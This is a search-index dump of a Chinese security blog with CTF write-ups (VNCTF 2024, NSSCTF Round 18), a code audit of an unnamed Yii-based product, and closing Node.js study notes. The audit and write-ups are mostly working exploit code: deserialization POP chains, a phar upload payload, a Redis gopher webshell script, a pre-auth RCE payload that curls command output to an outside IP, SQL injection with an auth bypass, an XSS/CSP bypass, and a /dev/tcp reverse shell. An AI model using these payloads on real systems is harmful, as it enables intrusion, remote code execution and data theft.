$this-\u003econfig['GROUP'] . '/'; for($i=0; $i\u003c$this-\u003econfig['HASH_DEEP']; $i++){ $dir = $dir. substr($key, $i*2, 2).'/'; } $dir = str_replace('/', DIRECTORY_SEPARATOR, $dir); if ( !file_exists($dir) ) { if ( !@mkdir($dir, 0777, true) ){ throw new \\Exception(\"Can not create dir '{$dir}'\", 500); } } if ( !is_writable($dir) ) @chmod($dir, 0777); return $dir. $key . '.php';; } 进行了一些目录文件名拼接的操作，然后返回一个php文件，但是我们并没有这个文件，所以会进入compile()方法中的if条件 if ( empty($ret['template']) || ($isTpl\u0026\u0026filemtime($tplFile)\u003e($ret['compile_time'])) ) { $template = $isTpl ? file_get_contents( $tplFile ) : $tpl; if( false === Hook::listen('templateParse', array($template), $template) ){ foreach ($this-\u003elabel as $key =\u003e $value) { $template = preg_replace($key, $value, $template); } } $ret = array('template'=\u003e$template, 'compile_time'=\u003etime()); $this-\u003ecache-\u003eset( $tplKey, serialize($ret), 86400*365); } 内容就是传入的$tpl，接着调用$this-\u003ecache-\u003eset()方法，写入内容 这里就利用FileCacheDriver类中的set()方法 public function set($key, $value, $expire = 1800){ $value = serialize($value); $md5Sign = md5($value); $expire = time() + $expire; $content = '\u003c?php exit;?\u003e' . sprintf('%012d', $expire) . $md5Sign . $value; return @file_put_contents($this-\u003e_getFilePath($key, true), $content, LOCK_EX); } 构造完整poc \u003c?php namespace ZhiCms\\ext{ use ZhiCms\\base\\cache\\MemcachedDriver; use ZhiCms\\base\\Template; class simple_html_dom{ public $nodes = array(); public function __construct(){ $this-\u003enodes[] = new MemcachedDriver; } } class simple_html_dom_node{ private $dom; public function __construct(){ $this-\u003edom-\u003ecallback = array(new Template,'display'); } } class Send { public function __construct(){ } } echo urlencode(serialize(new simple_html_dom)); } namespace ZhiCms\\base\\cache{ use ZhiCms\\ext\\simple_html_dom_node; use ZhiCms\\ext\\Send; class FileCacheDriver{ public function __construct(){ } } class MemcachedDriver{ protected $group = ''; protected $mmc = NULL; public function __construct(){ $this-\u003egroup = new simple_html_dom_node; $this-\u003emmc = new Send(); } } } namespace ZhiCms\\base{ use ZhiCms\\base\\cache\\FileCacheDriver; class Template { protected $vars = array(); protected $cache; public function __construct(){ $this-\u003evars=array(\"tpl\"=\u003e\"\u003c?=phpinfo();?\u003e\",\"isTpl\"=\u003efalse); $this-\u003ecache = new FileCacheDriver; } } } ?\u003e ","date":"2024-03-15","objectID":"/vnctf-2024-web/:6:1","tags":["VNCTF Web"],"title":"VNCTF 2024 Web","uri":"/vnctf-2024-web/"},{"categories":["代码审计"],"content":" 0x01 xxxx-mgr系统看完安装流程，先从web端入手，几套系统均采用Yii二开，在此先学习一下Yii的基础知识 https://www.yiiframework.com/doc/guide/2.0/zh-cn ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 前台SSRF本次审计漏洞重点放在前台/未授权上面， 在center/controllers/DemoController.php下，存在一个经典的SSRF漏洞，并且带回显 // php代理 实现get post请求 public function actionProxy(){ $rs = []; if(\\Yii::$app-\u003erequest-\u003eisPost){ $url = \\Yii::$app-\u003erequest-\u003epost('url'); $post_data = \\Yii::$app-\u003erequest-\u003epost(); $rs = $this-\u003epost($url,$post_data); }elseif (\\Yii::$app-\u003erequest-\u003eisGet){ $url = \\Yii::$app-\u003erequest-\u003eget('url'); $rs = $this-\u003eget($url); } return $rs; } // get private function get($url){ //初始化 $ch = curl_init(); //设置选项，包括URL curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); //执行并获取HTML文档内容 $output = curl_exec($ch); //释放curl句柄 curl_close($ch); return $output; } // post private function post($url,$post_data){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // post数据 curl_setopt($ch, CURLOPT_POST, 1); // post的变量 curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); $output = curl_exec($ch); curl_close($ch); return $output; } 构造请求/demo/proxy?url=file:///etc/passwd 尝试读取redis配置文件/xxxx/etc/system.conf online_server=\"127.0.0.1\" user_server=\"127.0.0.1\" auth_server=\"127.0.0.1\" detail_server=\"127.0.0.1\" log_server=\"127.0.0.1\" dye_server=\"127.0.0.1\" my_ip=\"127.0.0.1\" remote_dm_ip=\"\" thread_num =\"4\" redis_password=\"xxxxxx@redis\" cache_server=\"127.0.0.1\" 通过common/config/main-local.php文件得到redis端口在16xxx-16xxx 选择一个redis端口打一下 import urllib.parse protocol=\"gopher://\" ip=\"127.0.0.1\" port=\"16xxx\" shell=\"\\n\\n\u003c?php eval($_GET[\\\"cmd\\\"]);?\u003e\\n\\n\" filename=\"1.php\" path=\"/tmp\" passwd=\"xxxx@redis\" #如果无密码就不加，如果有密码就加 cmd=[ \"config set dir /tmp\", \"config set dbfilename success\", \"set 'test' 'success'\", \"save\", \"quit\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.parse.quote(redis_format(x)) print(urllib.parse.quote(payload)) config命令没有找到，很失败，在配置文件中看到了被禁用 版本是6.2.6也没办法主从复制Orz，但是在远程环境中部分是存在config命令的，从SSRF顺利变成了RCE ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:1","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 未授权任意文件下载由于是Yii框架，所以很快的找到了不做权限验证的api 在center/modules/user/controllers/GroupController.php控制器下， public function actionDownLoad() { //下载文件 if (Yii::$app-\u003erequest-\u003eget('file')) { return Yii::$app-\u003eresponse-\u003esendFile(Yii::$app-\u003erequest-\u003eget('file')); } if (Yii::$app-\u003esession-\u003eget('batch_excel_download_file')) { return Yii::$app-\u003eresponse-\u003esendFile(Yii::$app-\u003esession-\u003eget('batch_excel_download_file')); } else { Yii::$app-\u003egetSession()-\u003esetFlash('error', Yii::t('app', 'batch excel help31')); } return $this-\u003eredirect(['index']); } 跟进查看sendFile() public function sendFile($filePath, $attachmentName = null, $options = []) { if (!isset($options['mimeType'])) { $options['mimeType'] = FileHelper::getMimeTypeByExtension($filePath); } if ($attachmentName === null) { $attachmentName = basename($filePath); } $handle = fopen($filePath, 'rb'); $this-\u003esendStreamAsFile($handle, $attachmentName, $options); return $this; } 利用fopen函数打开了传入的文件路径，无任何过滤，直接读取文件 /user/group/down-load?file=/etc/passwd 但是任意文件下载危害并不大，我们需要以RCE为目的，在这种成熟框架面前，反序列化还是有的，碰巧fopen函数也支持phar://协议可以触发phar反序列化 反序列化挖掘Yii框架是2.0.45，这套系统加了一些vendor，同时也删除了一些Yii自带的vendor，所以只能靠我们自己挖一条链子出来，POC如下 POP Chain 1 \u003c?php namespace yii\\base { class Component { private $_events = array(); private $_behaviors = 1; public function __construct() { include(\"./vendor/opis/closure/autoload.php\"); $func = function(){ $cmd = 'touch /tmp/success'; system($cmd); }; $raw = \\Opis\\Closure\\serialize($func); $data=\\Opis\\Closure\\unserialize($raw); $this-\u003e_events = [\"afterOpen\" =\u003e [[ $data, \"huahua\" ]]]; } } } namespace yii\\redis{ use yii\\base\\Component; class Connection extends Component{ public $redisCommands = []; public $hostname = ''; public $port; public $password; public $username; public $connectionTimeout; public $dataTimeout; public $database; public $unixSocket; private $_socket; public function __construct() { $this-\u003eredisCommands = array('CLEAN UP'); $this-\u003e_socket = false; $this-\u003ehostname = '127.0.0.1'; $this-\u003eport = 8001;//能够连通的任意本地服务的端口 $this-\u003eunixSocket = false; $this-\u003econnectionTimeout = 5; parent::__construct(); } } } namespace setasign\\Fpdi\\PdfReader{ use yii\\redis\\Connection; class PdfReader{ protected $parser; public function __construct(){ $this-\u003eparser = new Connection; } } include(\"./vendor/opis/closure/autoload.php\"); echo urlencode(\\Opis\\Closure\\serialize(new PdfReader)); } ?\u003e POP Chain 2 \u003c?php namespace yii\\rest { class CreateAction { public $id; public $checkAccess; public function __construct() { $this-\u003echeckAccess = 'system'; $this-\u003eid = \"touch /tmp/success\"; } } } namespace yii\\base { use yii\\rest\\CreateAction; class Component { private $_events = array(); private $_behaviors = 1; public function __construct() { $this-\u003e_events = [\"afterOpen\" =\u003e [[ [new CreateAction,\"run\"], \"a\"]]]; } } } namespace yii\\redis{ use yii\\base\\Component; class Connection extends Component{ public $redisCommands = []; public $hostname = ''; public $port; public $password; public $username; public $connectionTimeout; public $dataTimeout; public $database; public $unixSocket; private $_socket; public function __construct() { $this-\u003eredisCommands = array('CLEAN UP'); $this-\u003e_socket = false; $this-\u003ehostname = '127.0.0.1'; $this-\u003eport = 8001;//能够连通的任意本地服务的端口 $this-\u003eunixSocket = false; $this-\u003econnectionTimeout = 5; parent::__construct(); } } } namespace setasign\\Fpdi\\PdfReader{ use yii\\redis\\Connection; class PdfReader{ protected $parser; public $test; public function __construct(){ $this-\u003eparser = new Connection; } } } namespace { use setasign\\Fpdi\\PdfReader\\PdfReader; $clazz = new PdfReader; @unlink(\"test.phar\"); $p = new Phar(\"test.phar\",0); $p-\u003estartBuffering(); $p-\u003esetMetadata($clazz); $p-\u003esetStub(\"GIF89a__HALT_COMPILER();\"); $p-\u003eaddFromString(\"huahua.txt\",\"successful!\"); $p-\u003estopBuffering(); } ?\u003e 上传phar文件在center/modules/report/controllers/SystemController.php控制器下正好存在一个写图片文件的地方 public function actionImageSave() { $post = Yii::$app-\u003erequest-\u003epost(); $picInfo = $post['baseimg']; $savingDir = 'uploads/monitor/'; if (!is_dir($savingDir)) { mkdir($savingDir); } $streamFileRand = $savingDir.$post['sql_type'].$post['proc'].'.png'; //图片名 Yii::$app-\u003esession-\u003eset('filename', $streamFileRand); preg_match('/(?\u003c=base64,)[\\S|\\s]+/',$picInfo,$picInfoW);//处理base64文本 file_put_contents($streamFileRand,base64_decode($picInfoW[0]));//文件写入 return true; } 最终利用step 1 POST /report/system/image-save HTTP/2 baseimg=base64,R0lGODlhX19IQUxUX0NPTVBJTEVSKCk7ID8%2bDQqlAgAAAQAAABEAAAABAAAAAABtAgAATzozMzoic2V0YXNpZ25cRnBkaVxQZGZSZWFkZXJcUGRmUmVhZGVyIjoyOntzOjk6IgAqAHBhcnNlciI7TzoyMDoieWlpXHJlZGlzXENvbm5lY3Rpb24iOjEyOntzOjEzOiJyZWRpc0NvbW1hbmRzIjthOjE6e2k6MDtzOjg6IkNMRUFOIFVQIjt9czo4OiJob3N0bmFtZSI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aTo4MDgxO3M6ODoicGFzc3dvcmQiO047czo4OiJ1c2VybmFtZSI7TjtzOjE3OiJjb25uZWN0aW9uVGltZW91dCI7aTo1O3M6MTE6ImRhdGFUaW1lb3V0IjtOO3M6ODoiZGF0YWJhc2UiO047czoxMDoidW5peFNvY2tldCI7YjowO3M6Mjk6IgB5aWlccmVkaXNcQ29ubmVjdGlvbgBfc29ja2V0IjtiOjA7czoyNzoiAHlpaVxiYXNlXENvbXBvbmVudABfZXZlbnRzIjthOjE6e3M6OToiYWZ0ZXJPcGVuIjthOjE6e2k6MDthOjI6e2k6MDthOjI6e2k6MDtPOjIxOiJ5aWlccmVzdFxDcmVhdGVBY3Rpb24iOjI6e3M6MjoiaWQiO3M6MTg6InRvdWNoIC90bXAvc3VjY2VzcyI7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjt9aToxO3M6MzoicnVuIjt9aToxO3M6MToiYSI7fX19czozMDoiAHlpaVxiYXNlXENvbXBvbmVudABfYmVoYXZpb3JzIjtpOjE7fXM6NDoidGVzdCI7Tjt9CgAAAGh1YWh1YS50eHQLAAAAjT7YZQsAAABYYbEEpAEAAAAAAABzdWNjZXNzZnVsIeJ7cw%2bG4EYC7FkDA58zSu4gzM18AgAAAEdCTUI%3d\u0026sql_type=hua\u0026proc=hua step 2 /user/group/down-load?file=phar://./uploads/monitor/huahua.png 成功利用 ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:2","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 前台无条件RCE既然挖到了两条链子，全局搜索unserialize函数 在center/modules/strategy/controllers/IpController.php控制器下面， 存在两个方法存在unserialize() public function actionBindIp(){ $data1 = unserialize(Yii::$app-\u003erequest-\u003epost('data1')); ... ... ... } public function actionCancelBindIp(){ $data1 = unserialize(Yii::$app-\u003erequest-\u003epost('data1')); ... ... ... } 构造poc POST /strategy/ip/bind-ip data1=O%3A33%3A%22setasign%5CFpdi%5CPdfReader%5CPdfReader%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00parser%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A12%3A%7Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22CLEAN+UP%22%3B%7Ds%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A8001%3Bs%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22username%22%3BN%3Bs%3A17%3A%22connectionTimeout%22%3Bi%3A5%3Bs%3A11%3A%22dataTimeout%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A10%3A%22unixSocket%22%3Bb%3A0%3Bs%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A275%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A127%3A%22function%28%29%7B%0A++++++++++++++++%24cmd+%3D+%27curl+http%3A%2F%2F124.220.215.8%3A1234%2F%3Fcmd%3D%60whoami%60%27%3B%0A++++++++++++++++%5Csystem%28%24cmd%29%3B%0A++++++++++++%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A18%3A%22yii%5Cbase%5CComponent%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000053bc12be000000004d2c46e6%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22huahua%22%3B%7D%7D%7Ds%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3B%7D%7D 成功RCE ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:3","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" API接口","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":" 0x00 SQL注入先来看一下如何做的权限验证 'authenticator' =\u003e [ 'class' =\u003e \\common\\extend\\ApiAuth::className(), ], 跟进ApiAuth类 public function authenticate($user, $request, $response) { // 如果是从 v2 过来的，就不要重复验证 if (substr($request-\u003epathInfo, 0, 7) === 'api/v2/') { return true; } $this-\u003eaccess_token = $this-\u003efindParams($request, $this-\u003etokenParam); $url = $this-\u003efindParams($request); $ip = $request-\u003egetUserIP(); $this-\u003evalidateAccessToken($ip, $url); $this-\u003evalidateRemoteAddress($ip, $url); if ($this-\u003evalidateAction($url, $ip)) { return true; } throw new UnauthorizedHttpException(\\Yii::t('app', 204010), 20401); } 先绕过第一个点validateAccessToken public function validateAccessToken($ip, $url) { //去缓存内先验证一下令牌是否有缓存,如果没有则去mysql表内查询 if (!Yii::$app-\u003ecache-\u003eget($this-\u003eaccess_token)) { //如果url是查询令牌接口，则根据请求ip来进查询数据 if ($url == '/api/v8/auth/get-access-token') { //按着ip精准查询 $tokenResource = IpBindingToken::find()-\u003ewhere(['ip' =\u003e $ip])-\u003easArray()-\u003eall(); //如果没查询到数据， 可能是授权的ip段 比如 192.168.1.100-192.168.1.105 if (!$tokenResource) { $tmp_ip = explode('.', $ip); unset($tmp_ip[3]); //根据ip前三位来查询数据 是一个二维数组 $tokenResource = IpBindingToken::find()-\u003efilterWhere(['like', 'ip', implode('.', $tmp_ip)])-\u003easArray()-\u003eall(); } //如果没查询到数据，返回机器未授权 if (!$tokenResource) { throw new UnauthorizedHttpException(Yii::t('app', 204013), 20401); } //如果是多个数组，那么这一步就必须要匹配到ip相对应的数据了 foreach ($tokenResource as $item) { //解析mysql存储的ip列数据，返回boolean $ipParseResult = $this-\u003eparseIp($ip, $item['ip']); //判断用户ip是否在ipMap数组内 if ($ipParseResult) { $this-\u003eaccess_token = $item['token']; Yii::$app-\u003ecache-\u003eadd($this-\u003eaccess_token, $item); break; } } //如果未能匹配到数据， 返回机器未授权错误 if ($this-\u003eaccess_token == $ip) { throw new UnauthorizedHttpException(Yii::t('app', 204013), 20401); } } else { //其他请求均以令牌为查询条件 $tokenResource = IpBindingToken::findOne(['token' =\u003e $this-\u003eaccess_token]); if (!$tokenResource) { //返回令牌错误 throw new UnauthorizedHttpException(Yii::t('app', 204012), 20401); } Yii::$app-\u003ecache-\u003eadd($this-\u003eaccess_token, $tokenResource-\u003eattributes); } } } 接收传入的参数access_token并且和数据库中的作对比，在/api/v8/auth/get-access-token中可以获取token，在请求时加上X-Forwarded-For: 127.0.0.1即可 第二个点validateRemoteAddress，这里没什么好说的，请求时加上X-Forwarded-For: 127.0.0.1和上面的access_token相匹配即可 绕过权限验证后，再来看控制器 rest/versions/api/immu/controllers/QueryController.php public function actionIndex() { $params = Yii::$app-\u003erequest-\u003eget(); $userName = @$params['user_name']; //$findUser = \"select user_name from `user` where user_name='$userName'\"; $findRes = $this-\u003egetUser($userName); if (!$findRes) { return Common::info(10002); } $time = @$params['time']; $timeNow = date('Ym',time()); if ($time == $timeNow){ //查mysql总和加redis在线total //查在线表总流量 $tableName = 'srun_detail'; $sql = \"select `rad_online_id` from `online_radius` where `user_name`='$userName'\"; $details = Yii::$app-\u003edb-\u003ecreateCommand($sql)-\u003equeryOne(); if (!$details){ $onlineBytes = 0; }else{ $hash = Redis::executeCommand('hGetAll', 'hash:rad_online:' . $details['rad_online_id'], [], 'redis_online'); if ($hash) { $onlineData = Redis::hashToArray($hash); $onlineBytes = $onlineData['bytes_in'] + $onlineData['bytes_out']; }else{ $onlineBytes = 0; } } }else{ $tableName = sprintf('srun_detail%s%s',\"_\",$time); $onlineBytes = 0; } $sql = \"select SUM(`total_bytes`) as `mysql_bytes` from `$tableName` where `user_name`='$userName'\"; $mysqlData = Yii::$app-\u003edb-\u003ecreateCommand($sql)-\u003equeryOne(); $allBytes = $mysqlData['mysql_bytes']; $allBytes = $allBytes + $onlineBytes; $result['total_bytes'] = sprintf(\"%.2f\",$allBytes/(1024**3)); $result['code'] = 'E00'; $result['msg'] = '成功'; return $result; } 在这里，直接做了拼接并且执行 $sql = \"select SUM(`total_bytes`) as `mysql_bytes` from `$tableName` where `user_name`='$userName'\"; $mysqlData = Yii::$app-\u003edb-\u003ecreateCommand($sql)-\u003equeryOne(); 构造payload GET /api/immu/query?access_token=FPFBWAk5llPf3Phd5drTiez9Uks1749J\u0026user_name=test002\u0026time=mobile_day`+where+user_name='test001'+union+select+1+and(select+sleep(3))%23 HTTP/2 Host: 192.168.0.105:8001 X-Forwarded-For: 127.0.0.1 ","date":"2024-03-02","objectID":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:1","tags":["Yii","PHP"],"title":"某大型系统代码审计","uri":"/%E6%9F%90%E5%A4%A7%E5%9E%8B%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["比赛记录"],"content":" 门酱想玩什么呢？右键源代码发现nssctfroundSpring.php \u003c?php highlight_file(__FILE__); //部分关键代码 $contentLines = explode(\" \", $comment['content']); if (preg_match('/^https?:\\/\\/\\S+$/', $contentLines[0])) { if (preg_match('/^https?:\\/\\/[^\\/]+\\/\\S+\\.png$/', $contentLines[0], $matches) \u0026\u0026 end($contentLines) === '/png') { $urlParts = parse_url($matches[0]); if ($urlParts !== false) { echo '\u003cimg class=\"content\" src=\"' . $matches[0] . '\"\u003e'; //....... } //...... } //...... } 很明显存在xss 通过查看评论区得知需要在门酱处访问元梦之星官网的url，在发表评论处正是上面得到的代码，于是利用 xss 还需要绕过CSP Content-Security-Policy: script-src 'self' 'unsafe-inline'; 利用window.location 构造poc https://\"\u003e\u003cscript\u003ewindow.location=\"https://ymzx.qq.com/\"\u003c/script\u003e.png /png 得到 http://node2.anna.nssctf.cn:28764/words/?title=MQ==\u0026content=aHR0cHMlM0ElMkYlMkYlMjIlM0UlM0NzY3JpcHQlM0V3aW5kb3cubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFLnBuZyUyMCUyRnBuZw== 在门酱处插入得到flag ","date":"2024-02-14","objectID":"/nssctf-round-18-basic/:1:0","tags":["CTF-Web"],"title":"NSSCTF Round 18 Basic","uri":"/nssctf-round-18-basic/"},{"categories":["比赛记录"],"content":" Becomeroot8.1.0-dev后门漏洞 GET / HTTP/1.1 Host: node1.anna.nssctf.cn:28073 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 User-Agentt: zerodiumsystem(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/vps/port 0\u003e\u00261'\"); Connection: close 利用工具进行扫描提权漏洞 https://github.com/The-Z-Labs/linux-exploit-suggester 利用CVE-2021-3156提权 https://github.com/Rvn0xsy/CVE-2021-3156-plus?tab=readme-ov-file ","date":"2024-02-14","objectID":"/nssctf-round-18-basic/:2:0","tags":["CTF-Web"],"title":"NSSCTF Round 18 Basic","uri":"/nssctf-round-18-basic/"},{"categories":["开发"],"content":" NodejsNodejs是一个基于 Chrome V8 引擎解析 JavaScript ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" fs 文件系统模块 const fs = require(\"fs\") fs.readFile(path[,options],callback) //读取文件 // 文件路径 // 以什么编码格式读取文件 // 文件读取完成后，通过回调函数拿到读取的结果 fs.writeFile(file,data[,options],callback) //向指定的文件写入内容 // 文件路径 // 写入的内容 // 以什么格式写入 // 文件写入完成后的回调函数 读取文件 const fs = require(\"fs\") fs.readFile(\"./test.txt\",\"utf8\",function(err,dataStr){ console.log(err) console.log(\"------\") console.log(dataStr) }) 写入文件 const fs = require(\"fs\") fs.writeFile(\"test.txt\",\"Hello World\",\"utf8\",function(err){ console.log(err) }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" path路径模块path 模块是用来提供处理路径的模块。 path.join()方法，用来将多个路径片段拼接成一个完整的路径字符串 path.basename()方法，用来从路径字符串中，将文件名解析出来 const path = require(\"path\"); path.join([...paths]) // 路径 path.basename(path[,ext]) // 文件路径 path.extname()获取路径中的扩展名部分 path.extname(path) // 文件路径 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" http模块创建 web 服务器的模块 const http = require('http') const server = http.createServer(); //使用服务器实例的 .on() 方法，为服务器绑定一个 request 事件 server.on('request',(req,res) =\u003e{ //req 请求对象 //req.url 是客户端请求的 URL 地址 //req.method 是客户端的 method 请求类型 //只要有客户端请求服务器，就会触发request事件，从而调用这个处理函数 //res 响应对象 const str = \"Hello World\" //向客户端响应内容 res.end(str) console.log(\"Someone visit our web server .\") }) server.listen(9091,()=\u003e{ console.log('http server running at http://127.0.0.1:9091') }) ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 模块化内置模块、自定义模块、第三方模块 // 加载内置模块 const fs = require(\"fs\") // 加载用户的自定义模块 const custom = require(\"./common.js\") // 加载第三方模块 const moment = require(\"moment\") ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 向外共享模块作用域中的成员module 对象 console.log(module) { id: '.', path: '/Users/f10wers13eicheng/Desktop/node-project', exports: {}, filename: '/Users/f10wers13eicheng/Desktop/node-project/index.js', loaded: false, children: [], paths: [ '/Users/f10wers13eicheng/Desktop/node-project/node_modules', '/Users/f10wers13eicheng/Desktop/node_modules', '/Users/f10wers13eicheng/node_modules', '/Users/node_modules', '/node_modules' ] } module.exports对象 可以将模块内的成员共享出去，供外界使用 module.exports.username = 'zs' module.exports.sayHello = function(){ console.log(\"Hello\") } 使用require()方法导入模块时，导入的结果，永远以module.exports指向的对象为准 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:1","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" npm与包https://www.npmjs.cn/ npm install 包的完整名称 初次装包完整后，在项目文件夹多一个叫做 node_modules的文件夹和package_locak.json的配置文件 npm i moment@2.22.2 安装指定的版本 包管理配置文件npm规定，在项目跟目录中，必须提供一个叫做 package.json的包管理配置文件。用来记录与项目有关的一些配置信息 快速创建package.json npm init -y npm install 会读取package.json文件进行下载 npm config get registry 查看当前的下包镜像源 包的分类指定-g 安装为全局包 不指定则为 项目包 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:5:2","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 模块的加载机制优先从缓存中加载 内置模块加载优先级最高 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:6:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" ExpressExpress 是基于 nodejs 平台，快速、开发、极简的 Web 开发框架 npm i express@4.17.1 ","date":"2024-02-06","objectID":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:7:0","tags":["NodeJS"],"title":"NodeJs学习","uri":"/nodejs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["开发"],"content":" 创建基本的 Web 服务器 const express = require(\"express\") // 创建 web 服务器 const app = express() app.listen(9091,()=\u003e{ console.log(\"express server running at http://127.0.0.1:9091\") }) 